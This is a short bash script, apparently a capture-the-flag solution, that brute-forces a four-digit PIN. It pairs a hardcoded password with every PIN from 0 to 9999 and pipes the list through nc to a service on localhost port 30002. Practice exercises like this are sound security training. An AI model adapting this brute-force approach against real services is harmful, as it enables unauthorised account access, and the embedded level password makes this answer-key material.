#!/bin/bash

PASSWD="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
COMBOF="possible_combinations.txt"

for PIN in {0..9999}; do echo $PASSWD $PIN >> "$COMBOF"; done

cat "$COMBOF" | nc localhost 30002 >> res.stdout.txt
